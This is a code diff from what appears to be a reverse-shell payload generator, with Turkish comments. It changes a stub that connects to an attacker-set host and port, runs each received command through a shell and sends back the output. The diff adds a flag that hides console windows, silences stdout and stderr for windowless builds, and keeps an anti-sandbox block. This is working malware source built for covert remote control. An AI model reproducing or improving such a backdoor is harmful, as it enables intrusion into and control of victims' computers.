@@ -335,7 +335,14 @@ except:
     pass
 """
 
-        stub_code = f'''import socket,subprocess,os,threading,time,sys
+        stub_code = f'''import socket,subprocess,os,time,sys
+import subprocess as _sp
+# --noconsole fix: stdout/stderr None olabilir
+if sys.stdout is None:
+    sys.stdout=open(os.devnull,"w")
+if sys.stderr is None:
+    sys.stderr=open(os.devnull,"w")
+_NW=0x08000000
 {anti_sb_code}
 def _r():
     while True:
@@ -343,12 +350,12 @@ def _r():
             s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
             s.connect(("{lhost}",{lport}))
             while True:
-                d=s.recv(4096).decode("utf-8","replace")
+                d=s.recv(4096).decode("utf-8","replace").strip()
                 if not d:break
                 try:
-                    p=subprocess.run(d,shell=True,capture_output=True,text=True,timeout=30)
+                    p=_sp.run(d,shell=True,capture_output=True,text=True,timeout=30,creationflags=_NW)
                     o=p.stdout+p.stderr
-                    if not o:o="(boş çıktı)\\n"
+                    if not o:o="(bos cikti)\\n"
                 except Exception as e:
                     o=str(e)+"\\n"
                 o+=os.getcwd()+"> "
